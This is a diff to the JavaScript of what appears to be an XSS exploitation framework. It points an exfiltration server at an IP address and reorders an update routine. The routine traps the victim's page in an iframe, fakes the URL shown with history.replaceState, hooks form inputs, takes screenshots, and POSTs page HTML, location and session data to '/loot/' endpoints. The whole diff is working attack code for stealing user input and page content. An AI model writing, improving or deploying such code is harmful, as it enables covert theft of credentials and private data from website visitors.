@@ -33,7 +33,7 @@ function initGlobals()
 
 
 	// Exfil server
-	window.taperexfilServer = "http://localhost:8444";
+	window.taperexfilServer = "https://192.168.2.61:8444";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -428,6 +428,8 @@ function sendHTML()
 
 
 
+
+
 // When this update fires, it checks the iframe trap URL
 // where the user thinks they are, then does a lot of things
 // Steals inputs, URL, screenshots, etc. 
@@ -478,25 +480,35 @@ function runUpdate()
 		request = new XMLHttpRequest();
 		request.open("POST", taperexfilServer + "/loot/location/" + tapersessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		
 		var jsonObj = new Object();
 		jsonObj["url"] = fullUrl;
 		var jsonString = JSON.stringify(jsonObj);
 		request.send(jsonString);
 
-		// Handle screenshotting
-		sendScreenshot();
 
-		// Handle input scraping
-		hookInputs();
+		// We need to wait until the ifram has loaded to
+		// do HTML based looting. 
+		document.getElementById("iframe_a").onload = function() {
+			// console.log("+++ Onload ready!");
 
-		// Exfil HTML code
-		if (taperexfilHTML)
-		{
-			sendHTML();
+			// Fake the URL that the user sees. This is important. 
+			window.history.replaceState(null, '', fakeUrl);
+
+			// Handle input scraping
+			hookInputs();
+
+			// Handle screenshotting
+			sendScreenshot();
+
+
+			// Exfil HTML code
+			if (taperexfilHTML)
+			{
+				sendHTML();
+			}
 		}
 	}
-
-
 
 
 	// Updates that need to happen constantly
@@ -519,10 +531,6 @@ function runUpdate()
 	// Check session storage
 	// Will only report when new or changed data found
 	checkSessionStorage();
-
-
-	// Fake the URL that the user sees. This is important. 
-	window.history.replaceState(null, '', fakeUrl);
 }
 
 
